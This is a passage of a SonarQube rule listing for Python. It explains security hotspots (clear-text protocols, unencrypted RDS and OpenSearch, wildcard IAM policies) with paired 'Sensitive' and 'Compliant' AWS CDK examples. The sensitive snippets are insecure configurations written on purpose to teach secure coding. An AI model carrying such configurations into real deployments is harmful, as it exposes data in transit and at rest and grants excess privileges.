username = os.getenv("username") # Compliant
password = os.getenv("password") # Compliant
usernamePassword = 'user=%s&amp;password=%s' % (username, password) # Compliant{code}
</pre>
<h2>See</h2>
<ul>
  <li> OWASP - <a href="https://owasp.org/Top10/A07_2021-Identification_and_Authentication_Failures/">Top 10 2021 Category A7 - Identification and
  Authentication Failures</a> </li>
  <li> OWASP - <a href="https://owasp.org/www-project-top-ten/2017/A2_2017-Broken_Authentication">Top 10 2017 Category A2 - Broken Authentication</a>
  </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/798">CWE-798 - Use of Hard-coded Credentials</a> </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/259">CWE-259 - Use of Hard-coded Password</a> </li>
  <li> Derived from FindSecBugs rule <a href="https://h3xstream.github.io/find-sec-bugs/bugs.htm#HARD_CODE_PASSWORD">Hard Coded Password</a> </li>
</ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=python:S5332">
              python:S5332
            </a>
          </td>
          <td>
            <details>
              <p>Clear-text protocols such as <code>ftp</code>, <code>telnet</code>, or <code>http</code> lack encryption of transported data, as well as the
capability to build an authenticated connection. It means that an attacker able to sniff traffic from the network can read, modify, or corrupt the
transported content. These protocols are not secure as they expose applications to an extensive range of risks:</p>
<ul>
  <li> sensitive data exposure </li>
  <li> traffic redirected to a malicious endpoint </li>
  <li> malware-infected software update or installer </li>
  <li> execution of client-side code </li>
  <li> corruption of critical information </li>
</ul>
<p>Even in the context of isolated networks like offline environments or segmented cloud environments, the insider threat exists. Thus, attacks
involving communications being sniffed or tampered with can still happen.</p>
<p>For example, attackers could successfully compromise prior security layers by:</p>
<ul>
  <li> bypassing isolation mechanisms </li>
  <li> compromising a component of the network </li>
  <li> getting the credentials of an internal IAM account (either from a service account or an actual person) </li>
</ul>
<p>In such cases, encrypting communications would decrease the chances of attackers to successfully leak data or steal credentials from other network
components. By layering various security practices (segmentation and encryption, for example), the application will follow the
<em>defense-in-depth</em> principle.</p>
<p>Note that using the <code>http</code> protocol is being deprecated by <a
href="https://blog.mozilla.org/security/2015/04/30/deprecating-non-secure-http">major web browsers</a>.</p>
<p>In the past, it has led to the following vulnerabilities:</p>
<ul>
  <li> <a href="https://nvd.nist.gov/vuln/detail/CVE-2019-6169">CVE-2019-6169</a> </li>
  <li> <a href="https://nvd.nist.gov/vuln/detail/CVE-2019-12327">CVE-2019-12327</a> </li>
  <li> <a href="https://nvd.nist.gov/vuln/detail/CVE-2019-11065">CVE-2019-11065</a> </li>
</ul>
<h2>Ask Yourself Whether</h2>
<ul>
  <li> Application data needs to be protected against falsifications or leaks when transiting over the network. </li>
  <li> Application data transits over an untrusted network. </li>
  <li> Compliance rules require the service to encrypt data in transit. </li>
  <li> Your application renders web pages with a relaxed mixed content policy. </li>
  <li> OS-level protections against clear-text traffic are deactivated. </li>
</ul>
<p>There is a risk if you answered yes to any of those questions.</p>
<h2>Recommended Secure Coding Practices</h2>
<ul>
  <li> Make application data transit over a secure, authenticated and encrypted protocol like TLS or SSH. Here are a few alternatives to the most
  common clear-text protocols:
    <ul>
      <li> Use <code>ssh</code> as an alternative to <code>telnet</code>. </li>
      <li> Use <code>sftp</code>, <code>scp</code>, or <code>ftps</code> instead of <code>ftp</code>. </li>
      <li> Use <code>https</code> instead of <code>http</code>. </li>
      <li> Use <code>SMTP</code> over <code>SSL/TLS</code> or <code>SMTP</code> with <code>STARTTLS</code> instead of clear-text SMTP. </li>
    </ul>  </li>
  <li> Enable encryption of cloud components communications whenever it is possible. </li>
  <li> Configure your application to block mixed content when rendering web pages. </li>
  <li> If available, enforce OS-level deactivation of all clear-text traffic. </li>
</ul>
<p>It is recommended to secure all transport channels, even on local networks, as it can take a single non-secure connection to compromise an entire
application or system.</p>
<h2>Sensitive Code Example</h2>
<pre>
url = "http://example.com" # Sensitive
url = "ftp://anonymous@example.com" # Sensitive
url = "telnet://anonymous@example.com" # Sensitive

import telnetlib
cnx = telnetlib.Telnet("towel.blinkenlights.nl") # Sensitive

import ftplib
cnx = ftplib.FTP("ftp.example.com") # Sensitive

import smtplib
smtp = smtplib.SMTP("smtp.example.com", port=587) # Sensitive
</pre>
<p>For <a
href="https://docs.aws.amazon.com/cdk/api/v2/python/aws_cdk.aws_elasticloadbalancingv2/ApplicationLoadBalancer.html">aws_cdk.aws_elasticloadbalancingv2.ApplicationLoadBalancer</a>:</p>
<pre>
from aws_cdk import (
    aws_elasticloadbalancingv2 as elbv2,
)

lb = elbv2.ApplicationLoadBalancer(
    self,
    "LB",
    vpc=vpc,
    internet_facing=True
)

lb.add_listener(
    "Listener-default",
    port=80, # Sensitive
    open=True
)
lb.add_listener(
    "Listener-http-explicit",
    protocol=elbv2.ApplicationProtocol.HTTP, # Sensitive
    port=8080,
    open=True
)
</pre>
<p>For <a
href="https://docs.aws.amazon.com/cdk/api/v2/python/aws_cdk.aws_elasticloadbalancingv2/ApplicationListener.html">aws_cdk.aws_elasticloadbalancingv2.ApplicationListener</a>:</p>
<pre>
from aws_cdk import (
    aws_elasticloadbalancingv2 as elbv2,
)

elbv2.ApplicationListener(
    self,
    "listener-http-explicit-const",
    load_balancer=lb,
    protocol=elbv2.ApplicationProtocol.HTTP, # Sensitive
    port=8081,
    open=True
)
</pre>
<p>For <a
href="https://docs.aws.amazon.com/cdk/api/v2/python/aws_cdk.aws_elasticloadbalancingv2/NetworkLoadBalancer.html">aws_cdk.aws_elasticloadbalancingv2.NetworkLoadBalancer</a>:</p>
<pre>
from aws_cdk import (
    aws_elasticloadbalancingv2 as elbv2,
)
lb = elbv2.NetworkLoadBalancer(
    self,
    "LB",
    vpc=vpc,
    internet_facing=True
)

lb.add_listener( # Sensitive
    "Listener-default",
    port=1234
)
lb.add_listener(
    "Listener-TCP-explicit",
    protocol=elbv2.Protocol.TCP, # Sensitive
    port=1337
)
</pre>
<p>For <a
href="https://docs.aws.amazon.com/cdk/api/v2/python/aws_cdk.aws_elasticloadbalancingv2/NetworkListener.html">aws_cdk.aws_elasticloadbalancingv2.NetworkListener</a>:</p>
<pre>
from aws_cdk import (
    aws_elasticloadbalancingv2 as elbv2,
)

elbv2.NetworkListener(
    self,
    "Listener-TCP-explicit",
    protocol=elbv2.Protocol.TCP, # Sensitive
    port=1338,
    load_balancer=lb
)
</pre>
<p>For <a
href="https://docs.aws.amazon.com/cdk/api/v2/python/aws_cdk.aws_elasticloadbalancingv2/CfnListener.html">aws_cdk.aws_elasticloadbalancingv2.CfnListener</a>:</p>
<pre>
from aws_cdk import (
    aws_elasticloadbalancingv2 as elbv2,
)

elbv2.CfnListener(
    self,
    "listener-http",
    default_actions=[application_default_action],
    load_balancer_arn=lb.load_balancer_arn,
    protocol="HTTP", # Sensitive
    port=80
)

elbv2.CfnListener(
    self,
    "listener-tcp",
    default_actions=[network_default_action],
    load_balancer_arn=lb.load_balancer_arn,
    protocol="TCP", # Sensitive
    port=1000
)
</pre>
<p>For <a
href="https://docs.aws.amazon.com/cdk/api/v2/python/aws_cdk.aws_elasticloadbalancing/LoadBalancerListener.html">aws_cdk.aws_elasticloadbalancing.LoadBalancerListener</a>:</p>
<pre>
from aws_cdk import (
    aws_elasticloadbalancing as elb,
)

elb.LoadBalancerListener(
    external_port=10000,
    external_protocol=elb.LoadBalancingProtocol.TCP, # Sensitive
    internal_port=10000
)

elb.LoadBalancerListener(
    external_port=10080,
    external_protocol=elb.LoadBalancingProtocol.HTTP, # Sensitive
    internal_port=10080
)
</pre>
<p>For <a
href="https://docs.aws.amazon.com/cdk/api/v2/python/aws_cdk.aws_elasticloadbalancing/CfnLoadBalancer.html">aws_cdk.aws_elasticloadbalancing.CfnLoadBalancer</a>:</p>
<pre>
from aws_cdk import (
    aws_elasticloadbalancing as elb
)

elb.CfnLoadBalancer(
    self,
    "elb-tcp",
    listeners=[
        elb.CfnLoadBalancer.ListenersProperty(
            instance_port="10000",
            load_balancer_port="10000",
            protocol="tcp" # Sensitive
        )
    ],
    subnets=vpc.select_subnets().subnet_ids
)

elb.CfnLoadBalancer(
    self,
    "elb-http-dict",
    listeners=[
        {
            "instancePort":"10000",
            "loadBalancerPort":"10000",
            "protocol":"http" # Sensitive
        }
    ],
    subnets=vpc.select_subnets().subnet_ids
)
</pre>
<p>For <a
href="https://docs.aws.amazon.com/cdk/api/v2/python/aws_cdk.aws_elasticloadbalancing/LoadBalancer.html">aws_cdk.aws_elasticloadbalancing.LoadBalancer</a>:</p>
<pre>
from aws_cdk import (
    aws_elasticloadbalancing as elb,
)

elb.LoadBalancer(
    self,
    "elb-tcp-dict",
    vpc=vpc,
    listeners=[
        {
            "externalPort":10000,
            "externalProtocol":elb.LoadBalancingProtocol.TCP, # Sensitive
            "internalPort":10000
        }
    ]
)

loadBalancer.add_listener(
    external_port=10081,
    external_protocol=elb.LoadBalancingProtocol.HTTP, # Sensitive
    internal_port=10081
)
loadBalancer.add_listener(
    external_port=10001,
    external_protocol=elb.LoadBalancingProtocol.TCP, # Sensitive
    internal_port=10001
)
</pre>
<p>For <a
href="https://docs.aws.amazon.com/cdk/api/v2/python/aws_cdk.aws_elasticache/CfnReplicationGroup.html">aws_cdk.aws_elasticache.CfnReplicationGroup</a>:</p>
<pre>
from aws_cdk import (
    aws_elasticache as elasticache
)

elasticache.CfnReplicationGroup(
    self,
    "unencrypted-explicit",
    replication_group_description="a replication group",
    automatic_failover_enabled=False,
    transit_encryption_enabled=False, # Sensitive
    cache_subnet_group_name="test",
    engine="redis",
    engine_version="3.2.6",
    num_cache_clusters=1,
    cache_node_type="cache.t2.micro"
)

elasticache.CfnReplicationGroup( # Sensitive, encryption is disabled by default
    self,
    "unencrypted-implicit",
    replication_group_description="a test replication group",
    automatic_failover_enabled=False,
    cache_subnet_group_name="test",
    engine="redis",
    engine_version="3.2.6",
    num_cache_clusters=1,
    cache_node_type="cache.t2.micro"
)
</pre>
<p>For <a href="https://docs.aws.amazon.com/cdk/api/v2/python/aws_cdk.aws_kinesis/CfnStream.html">aws_cdk.aws_kinesis.CfnStream</a>:</p>
<pre>
from aws_cdk import (
    aws_kinesis as kinesis,
)

kinesis.CfnStream( # Sensitive, encryption is disabled by default for CfnStreams
    self,
    "cfnstream-implicit-unencrytped",
    shard_count=1
)

kinesis.CfnStream(self,
    "cfnstream-explicit-unencrytped",
    shard_count=1,
    stream_encryption=None # Sensitive
)
</pre>
<p>For <a href="https://docs.aws.amazon.com/cdk/api/v2/python/aws_cdk.aws_kinesis/Stream.html">aws_cdk.aws_kinesis.Stream</a>:</p>
<pre>
from aws_cdk import (
    aws_kinesis as kinesis,
)

stream = kinesis.Stream(self,
    "stream-explicit-unencrypted",
    shard_count=1,
    encryption=kinesis.StreamEncryption.UNENCRYPTED # Sensitive
)
</pre>
<h2>Compliant Solution</h2>
<pre>
url = "https://example.com"
url = "sftp://anonymous@example.com"
url = "ssh://anonymous@example.com"

import ftplib
cnx = ftplib.FTP_TLS("ftp.example.com")

import smtplib
smtp = smtplib.SMTP("smtp.example.com", port=587)
smtp.starttls(context=context)

smtp_ssl = smtplib.SMTP_SSL("smtp.gmail.com", port=465)
</pre>
<p>For <a
href="https://docs.aws.amazon.com/cdk/api/v2/python/aws_cdk.aws_elasticloadbalancingv2/ApplicationLoadBalancer.html">aws_cdk.aws_elasticloadbalancingv2.ApplicationLoadBalancer</a>:</p>
<pre>
from aws_cdk import (
    aws_elasticloadbalancingv2 as elbv2,
)

lb = elbv2.ApplicationLoadBalancer(
    self,
    "LB",
    vpc=vpc,
    internet_facing=True
)

lb.add_listener(
    "Listener-https-explicit",
    protocol=elbv2.ApplicationProtocol.HTTPS,
    certificates=[elbv2.ListenerCertificate("certificateARN")],
    port=443,
    open=True
)

lb.add_listener(
    "Listener-https-implicit",
    certificates=[elbv2.ListenerCertificate("certificateARN")],
    port=8443,
    open=True
)
</pre>
<p>For <a href="https://docs.aws.amazon.com/cdk/api/v2/python/aws_cdk.aws_elasticloadbalancingv2/ApplicationListener.html">
aws_cdk.aws_elasticloadbalancingv2.ApplicationListener</a>:</p>
<pre>
from aws_cdk import (
    aws_elasticloadbalancingv2 as elbv2,
)

elbv2.ApplicationListener(
    self,
    "listener-https-explicit-const",
    load_balancer=lb,
    protocol=elbv2.ApplicationProtocol.HTTPS,
    certificates=[elbv2.ListenerCertificate("certificateARN")],
    port=444,
    open=True
)
</pre>
<p>For <a
href="https://docs.aws.amazon.com/cdk/api/v2/python/aws_cdk.aws_elasticloadbalancingv2/NetworkLoadBalancer.html">aws_cdk.aws_elasticloadbalancingv2.NetworkLoadBalancer</a>:</p>
<pre>
from aws_cdk import (
    aws_elasticloadbalancingv2 as elbv2,
)
lb = elbv2.NetworkLoadBalancer(
    self,
    "LB",
    vpc=vpc,
    internet_facing=True
)

lb.add_listener(
    "Listener-TLS-explicit",
    protocol=elbv2.Protocol.TLS,
    certificates=[elbv2.ListenerCertificate("certificateARN")],
    port=443
)
lb.add_listener(
    "Listener-TLS-implicit",
    certificates=[elbv2.ListenerCertificate("certificateARN")],
    port=1024
)
</pre>
<p>For <a
href="https://docs.aws.amazon.com/cdk/api/v2/python/aws_cdk.aws_elasticloadbalancingv2/NetworkListener.html">aws_cdk.aws_elasticloadbalancingv2.NetworkListener</a>:</p>
<pre>
from aws_cdk import (
    aws_elasticloadbalancingv2 as elbv2,
)

elbv2.NetworkListener(
    self,
    "Listener-TLS-explicit",
    protocol=elbv2.Protocol.TLS,
    certificates=[elbv2.ListenerCertificate("certificateARN")],
    port=443,
    load_balancer=lb
)
</pre>
<p>For <a
href="https://docs.aws.amazon.com/cdk/api/v2/python/aws_cdk.aws_elasticloadbalancingv2/CfnListener.html">aws_cdk.aws_elasticloadbalancingv2.CfnListener</a>:</p>
<pre>
from aws_cdk import (
    aws_elasticloadbalancingv2 as elbv2,
)

elbv2.CfnListener(
    self,
    "listener-https",
    default_actions=[application_default_action],
    load_balancer_arn=lb.load_balancer_arn,
    protocol="HTTPS",
    port=443,
    certificates=[elbv2.CfnListener.CertificateProperty(
        certificate_arn="certificateARN"
    )]
)

elbv2.CfnListener(
    self,
    "listener-tls",
    default_actions=[network_default_action],
    load_balancer_arn=lb.load_balancer_arn,
    protocol="TLS",
    port=1001,
    certificates=[elbv2.CfnListener.CertificateProperty(
        certificate_arn="certificateARN"
    )]
)
</pre>
<p>For <a
href="https://docs.aws.amazon.com/cdk/api/v2/python/aws_cdk.aws_elasticloadbalancing/LoadBalancerListener.html">aws_cdk.aws_elasticloadbalancing.LoadBalancerListener</a>:</p>
<pre>
from aws_cdk import (
    aws_elasticloadbalancing as elb,
)

elb.LoadBalancerListener(
    external_port=10043,
    external_protocol=elb.LoadBalancingProtocol.SSL,
    internal_port=10043,
    ssl_certificate_arn="certificateARN"
)

elb.LoadBalancerListener(
    external_port=10443,
    external_protocol=elb.LoadBalancingProtocol.HTTPS,
    internal_port=10443,
    ssl_certificate_arn="certificateARN"
)
</pre>
<p>For <a
href="https://docs.aws.amazon.com/cdk/api/v2/python/aws_cdk.aws_elasticloadbalancing/CfnLoadBalancer.html">aws_cdk.aws_elasticloadbalancing.CfnLoadBalancer</a>:</p>
<pre>
from aws_cdk import (
    aws_elasticloadbalancing as elb,
)

elb.CfnLoadBalancer(
    self,
    "elb-ssl",
    listeners=[
        elb.CfnLoadBalancer.ListenersProperty(
            instance_port="10043",
            load_balancer_port="10043",
            protocol="ssl",
            ssl_certificate_id=CERTIFICATE_ARN
        )
    ],
    subnets=vpc.select_subnets().subnet_ids
)

elb.CfnLoadBalancer(
    self,
    "elb-https-dict",
    listeners=[
        {
            "instancePort":"10443",
            "loadBalancerPort":"10443",
            "protocol":"https",
            "sslCertificateId":CERTIFICATE_ARN
        }
    ],
    subnets=vpc.select_subnets().subnet_ids
)
</pre>
<p>For <a
href="https://docs.aws.amazon.com/cdk/api/v2/python/aws_cdk.aws_elasticloadbalancing/LoadBalancer.html">aws_cdk.aws_elasticloadbalancing.LoadBalancer</a>:</p>
<pre>
from aws_cdk import (
    aws_elasticloadbalancing as elb,
)

elb.LoadBalancer(
    self,
    "elb-ssl",
    vpc=vpc,
    listeners=[
        {
            "externalPort":10044,
            "externalProtocol":elb.LoadBalancingProtocol.SSL,
            "internalPort":10044,
            "sslCertificateArn":"certificateARN"
        },
        {
            "externalPort":10444,
            "externalProtocol":elb.LoadBalancingProtocol.HTTPS,
            "internalPort":10444,
            "sslCertificateArn":"certificateARN"
        }
    ]
)

loadBalancer = elb.LoadBalancer(
        self,
        "elb-multi-listener",
        vpc=vpc
)
loadBalancer.add_listener(
    external_port=10045,
    external_protocol=elb.LoadBalancingProtocol.SSL,
    internal_port=10045,
    ssl_certificate_arn="certificateARN"
)
loadBalancer.add_listener(
    external_port=10445,
    external_protocol=elb.LoadBalancingProtocol.HTTPS,
    internal_port=10445,
    ssl_certificate_arn="certificateARN"
)
</pre>
<p>For <a
href="https://docs.aws.amazon.com/cdk/api/v2/python/aws_cdk.aws_elasticache/CfnReplicationGroup.html">aws_cdk.aws_elasticache.CfnReplicationGroup</a>:</p>
<pre>
from aws_cdk import (
    aws_elasticache as elasticache
)

elasticache.CfnReplicationGroup(
    self,
    "encrypted-explicit",
    replication_group_description="a test replication group",
    automatic_failover_enabled=False,
    transit_encryption_enabled=True,
    cache_subnet_group_name="test",
    engine="redis",
    engine_version="3.2.6",
    num_cache_clusters=1,
    cache_node_type="cache.t2.micro"
)
</pre>
<p>For <a href="https://docs.aws.amazon.com/cdk/api/v2/python/aws_cdk.aws_kinesis/CfnStream.html">aws_cdk.aws_kinesis.CfnStream</a>:</p>
<pre>
from aws_cdk import (
    aws_kinesis as kinesis,
)

kinesis.CfnStream(
    self,
    "cfnstream-explicit-encrytped",
    shard_count=1,
    stream_encryption=kinesis.CfnStream.StreamEncryptionProperty(
        encryption_type="KMS",
        key_id="alias/aws/kinesis"
    )
)

stream = kinesis.CfnStream(
    self,
    "cfnstream-explicit-encrytped-dict",
    shard_count=1,
    stream_encryption={
        "encryptionType": "KMS",
        "keyId": "alias/aws/kinesis"
    }
)
</pre>
<p>For <a href="https://docs.aws.amazon.com/cdk/api/v2/python/aws_cdk.aws_kinesis/Stream.html">aws_cdk.aws_kinesis.Stream</a>:</p>
<pre>
from aws_cdk import (
    aws_kinesis as kinesis,
    aws_kms as kms
)

stream = kinesis.Stream( # Encryption is enabled by default for Streams
    self,
    "stream-implicit-encrypted",
    shard_count=1
)

stream = kinesis.Stream(
    self,
    "stream-explicit-encrypted-managed",
    shard_count=1,
    encryption=kinesis.StreamEncryption.MANAGED
)

key = kms.Key(self, "managed_key")
stream = kinesis.Stream(
    self,
    "stream-explicit-encrypted-selfmanaged",
    shard_count=1,
    encryption=kinesis.StreamEncryption.KMS,
    encryption_key=key
)
</pre>
<h2>Exceptions</h2>
<p>No issue is reported for the following cases because they are not considered sensitive:</p>
<ul>
  <li> Insecure protocol scheme followed by loopback addresses like 127.0.0.1 or <code>localhost</code>. </li>
</ul>
<h2>See</h2>
<ul>
  <li> OWASP - <a href="https://owasp.org/Top10/A02_2021-Cryptographic_Failures/">Top 10 2021 Category A2 - Cryptographic Failures</a> </li>
  <li> OWASP - <a href="https://owasp.org/www-project-top-ten/2017/A3_2017-Sensitive_Data_Exposure">Top 10 2017 Category A3 - Sensitive Data Exposure
  </a> </li>
  <li> OWASP - <a href="https://mobile-security.gitbook.io/masvs/security-requirements/0x10-v5-network_communication_requirements">Mobile AppSec
  Verification Standard - Network Communication Requirements</a> </li>
  <li> OWASP - <a href="https://owasp.org/www-project-mobile-top-10/2016-risks/m3-insecure-communication">Mobile Top 10 2016 Category M3 - Insecure
  Communication</a> </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/200">CWE-200 - Exposure of Sensitive Information to an Unauthorized Actor</a> </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/319">CWE-319 - Cleartext Transmission of Sensitive Information</a> </li>
  <li> <a href="https://security.googleblog.com/2016/09/moving-towards-more-secure-web.html">Google, Moving towards more secure web</a> </li>
  <li> <a href="https://blog.mozilla.org/security/2015/04/30/deprecating-non-secure-http/">Mozilla, Deprecating non secure http</a> </li>
  <li> <a href="https://docs.aws.amazon.com/elasticloadbalancing/latest/application/load-balancer-listeners.html">AWS Documentation</a> - Listeners
  for your Application Load Balancers </li>
  <li> <a href="https://docs.aws.amazon.com/AWSCloudFormation/latest/UserGuide/aws-properties-kinesis-stream-streamencryption.html">AWS
  Documentation</a> - Stream Encryption </li>
</ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=python:S6303">
              python:S6303
            </a>
          </td>
          <td>
            <details>
              <p>Using unencrypted RDS DB resources exposes data to unauthorized access.<br> This includes database data, logs, automatic backups, read replicas,
snapshots, and cluster metadata.</p>
<p>This situation can occur in a variety of scenarios, such as:</p>
<ul>
  <li> A malicious insider working at the cloud provider gains physical access to the storage device. </li>
  <li> Unknown attackers penetrate the cloud provider’s logical infrastructure and systems. </li>
</ul>
<p>After a successful intrusion, the underlying applications are exposed to:</p>
<ul>
  <li> theft of intellectual property and/or personal data </li>
  <li> extortion </li>
  <li> denial of services and security bypasses via data corruption or deletion </li>
</ul>
<p>AWS-managed encryption at rest reduces this risk with a simple switch.</p>
<h2>Ask Yourself Whether</h2>
<ul>
  <li> The database contains sensitive data that could cause harm when leaked. </li>
  <li> There are compliance requirements for the service to store data encrypted. </li>
</ul>
<p>There is a risk if you answered yes to any of those questions.</p>
<h2>Recommended Secure Coding Practices</h2>
<p>It is recommended to enable encryption at rest on any RDS DB resource, regardless of the engine.<br> In any case, no further maintenance is
required as encryption at rest is fully managed by AWS.</p>
<h2>Sensitive Code Example</h2>
<p>For <a href="https://docs.aws.amazon.com/cdk/api/v2/docs/aws-cdk-lib.aws_rds.DatabaseCluster.html">aws_cdk.aws_rds.DatabaseCluster</a> and <a
href="https://docs.aws.amazon.com/cdk/api/v2/docs/aws-cdk-lib.aws_rds.DatabaseInstance.html">aws_cdk.aws_rds.DatabaseInstance</a>:</p>
<pre>
from aws_cdk import (
    aws_rds as rds
)

class DatabaseStack(Stack):
    def __init__(self, scope: Construct, construct_id: str, **kwargs) -&gt; None:
        super().__init__(scope, construct_id, **kwargs)
        rds.DatabaseCluster( # Sensitive, unencrypted by default
            self,
            "example"
        )
</pre>
<p>For <a href="https://docs.aws.amazon.com/cdk/api/v2/docs/aws-cdk-lib.aws_rds.CfnDBCluster.html">aws_cdk.aws_rds.CfnDBCluster</a> and <a
href="https://docs.aws.amazon.com/cdk/api/v2/docs/aws-cdk-lib.aws_rds.CfnDBInstance.html">aws_cdk.aws_rds.CfnDBInstance</a>:</p>
<pre>
from aws_cdk import (
    aws_rds as rds
)

class DatabaseStack(Stack):
    def __init__(self, scope: Construct, construct_id: str, **kwargs) -&gt; None:
        super().__init__(scope, construct_id, **kwargs)
        rds.CfnDBCluster( # Sensitive, unencrypted by default
            self,
            "example"
        )
</pre>
<h2>Compliant Solution</h2>
<p>For <a href="https://docs.aws.amazon.com/cdk/api/v2/docs/aws-cdk-lib.aws_rds.DatabaseCluster.html">aws_cdk.aws_rds.DatabaseCluster</a> and <a
href="https://docs.aws.amazon.com/cdk/api/v2/docs/aws-cdk-lib.aws_rds.DatabaseInstance.html">aws_cdk.aws_rds.DatabaseInstance</a>:</p>
<pre>
from aws_cdk import (
    aws_rds as rds
)

class DatabaseStack(Stack):
    def __init__(self, scope: Construct, construct_id: str, **kwargs) -&gt; None:
        super().__init__(scope, construct_id, **kwargs)
        rds.DatabaseCluster(
            self,
            "example",
            storage_encrypted=True
        )
</pre>
<p>For <a href="https://docs.aws.amazon.com/cdk/api/v2/docs/aws-cdk-lib.aws_rds.CfnDBCluster.html">aws_cdk.aws_rds.CfnDBCluster</a> and <a
href="https://docs.aws.amazon.com/cdk/api/v2/docs/aws-cdk-lib.aws_rds.CfnDBInstance.html">aws_cdk.aws_rds.CfnDBInstance</a>:</p>
<pre>
from aws_cdk import (
    aws_rds as rds
)

class DatabaseStack(Stack):
    def __init__(self, scope: Construct, construct_id: str, **kwargs) -&gt; None:
        super().__init__(scope, construct_id, **kwargs)
        rds.CfnDBCluster(
            self,
            "example",
            storage_encrypted=True
        )
</pre>
<h2>See</h2>
<ul>
  <li> <a href="https://docs.aws.amazon.com/AmazonRDS/latest/UserGuide/Overview.Encryption.html">AWS Documentation</a> - Encrypting Amazon RDS
  resources </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/311">CWE-311 - Missing Encryption of Sensitive Data</a> </li>
</ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=python:S6302">
              python:S6302
            </a>
          </td>
          <td>
            <details>
              <p>A policy that grants all permissions may indicate an improper access control, which violates <a
href="https://en.wikipedia.org/wiki/Principle_of_least_privilege">the principle of least privilege</a>. Suppose an identity is granted full
permissions to a resource even though it only requires read permission to work as expected. In this case, an unintentional overwriting of resources
may occur and therefore result in loss of information.</p>
<h2>Ask Yourself Whether</h2>
<p>Identities obtaining all the permissions:</p>
<ul>
  <li> only require a subset of these permissions to perform the intended function. </li>
  <li> have monitored activity showing that only a subset of these permissions is actually used. </li>
</ul>
<p>There is a risk if you answered yes to any of those questions.</p>
<h2>Recommended Secure Coding Practices</h2>
<p>It’s recommended to apply the least privilege principle, i.e. by only granting the necessary permissions to identities. A good practice is to start
with the very minimum set of permissions and to refine the policy over time. In order to fix overly permissive policies already deployed in
production, a strategy could be to review the monitored activity in order to reduce the set of permissions to those most used.</p>
<h2>Sensitive Code Example</h2>
<p>A customer-managed policy that grants all permissions by using the wildcard (*) in the <code>Action</code> property:</p>
<pre>
from aws_cdk.aws_iam import PolicyStatement, Effect

PolicyStatement(
    effect=Effect.ALLOW,
    actions=["*"], # Sensitive
    resources=["arn:aws:iam:::user/*"]
)
</pre>
<h2>Compliant Solution</h2>
<p>A customer-managed policy that grants only the required permissions:</p>
<pre>
from aws_cdk.aws_iam import PolicyStatement, Effect

PolicyStatement(
    effect=Effect.ALLOW,
    actions=["iam:GetAccountSummary"],
    resources=["arn:aws:iam:::user/*"]
)
</pre>
<h2>See</h2>
<ul>
  <li> <a href="https://docs.aws.amazon.com/IAM/latest/UserGuide/best-practices.html#grant-least-privilege">AWS Documentation</a> - Grant least
  privilege </li>
  <li> <a href="https://cloud.google.com/iam/docs/understanding-roles">Google Cloud Documentation</a> - Understanding roles </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/732">CWE-732 - Incorrect Permission Assignment for Critical Resource</a> </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/284">CWE-284 - Improper Access Control</a> </li>
</ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=python:S6308">
              python:S6308
            </a>
          </td>
          <td>
            <details>
              <p>Amazon OpenSearch Service is a managed service to host OpenSearch instances. It replaces Elasticsearch Service, which has been deprecated.</p>
<p>To harden domain (cluster) data in case of unauthorized access, OpenSearch provides data-at-rest encryption if the engine is OpenSearch (any
version), or Elasticsearch with a version of 5.1 or above. Enabling encryption at rest will help protect:</p>
<ul>
  <li> indices </li>
  <li> logs </li>
  <li> swap files </li>
  <li> data in the application directory </li>
  <li> automated snapshots </li>
</ul>
<p>Thus, adversaries cannot access the data if they gain physical access to the storage medium.</p>
<h2>Ask Yourself Whether</h2>
<ul>
  <li> The database contains sensitive data that could cause harm when leaked. </li>
  <li> There are compliance requirements for the service to store data encrypted. </li>
</ul>
<p>There is a risk if you answered yes to any of those questions.</p>
<h2>Recommended Secure Coding Practices</h2>
<p>It is recommended to encrypt OpenSearch domains that contain sensitive information.</p>
<p>OpenSearch handles encryption and decryption transparently, so no further modifications to the application are necessary.</p>
<h2>Sensitive Code Example</h2>
<p>For <a href="https://docs.aws.amazon.com/cdk/api/v2/python/aws_cdk.aws_opensearchservice/Domain.html">aws_cdk.aws_opensearchservice.Domain</a>:</p>
<pre>
from aws_cdk.aws_opensearchservice import Domain, EngineVersion

class DomainStack(Stack):
    def __init__(self, scope: Construct, construct_id: str, **kwargs) -&gt; None:
        super().__init__(scope, construct_id, **kwargs)

        Domain(self, "Sensitive",
            version=EngineVersion.OPENSEARCH_1_3
        ) # Sensitive, encryption is disabled by default
</pre>
<p>For <a
href="https://docs.aws.amazon.com/cdk/api/v2/python/aws_cdk.aws_opensearchservice/CfnDomain.html">aws_cdk.aws_opensearchservice.CfnDomain</a>:</p>
<pre>
from aws_cdk.aws_opensearchservice import CfnDomain

class CfnDomainStack(Stack):
    def __init__(self, scope: Construct, construct_id: str, **kwargs) -&gt; None:
        super().__init__(scope, construct_id, **kwargs)

        CfnDomain(self, "Sensitive") # Sensitive, encryption is disabled by default
</pre>
<h2>Compliant Solution</h2>
<p>For <a href="https://docs.aws.amazon.com/cdk/api/v2/python/aws_cdk.aws_opensearchservice/Domain.html">aws_cdk.aws_opensearchservice.Domain</a>:</p>
<pre>
from aws_cdk.aws_opensearchservice import Domain, EncryptionAtRestOptions, EngineVersion

class DomainStack(Stack):
    def __init__(self, scope: Construct, construct_id: str, **kwargs) -&gt; None:
        super().__init__(scope, construct_id, **kwargs)

        Domain(self, "Compliant",
            version=EngineVersion.OPENSEARCH_1_3,
            encryption_at_rest=EncryptionAtRestOptions(
                enabled=True
            )
        )
</pre>
<p>For <a
href="https://docs.aws.amazon.com/cdk/api/v2/python/aws_cdk.aws_opensearchservice/CfnDomain.html">aws_cdk.aws_opensearchservice.CfnDomain</a>:</p>
<pre>
from aws_cdk.aws_opensearchservice import CfnDomain

class CfnDomainStack(Stack):
